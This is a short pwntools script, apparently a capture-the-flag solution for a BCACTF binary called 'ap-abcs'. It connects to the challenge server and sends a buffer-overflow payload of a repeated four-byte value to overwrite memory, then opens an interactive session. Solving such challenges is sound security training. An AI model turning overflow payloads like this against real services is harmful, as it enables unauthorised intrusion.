from pwn import *

exe = ELF("./ap-abcs_patched")
context.binary = exe
def conn():
    r = process([exe.path])
    return r
def main():
    #r = conn()
    r = remote("bin.bcactf.com", 49154)
    r.sendline(p32(0x73434241)*0x50)
    r.interactive()

if __name__ == "__main__":
    main()
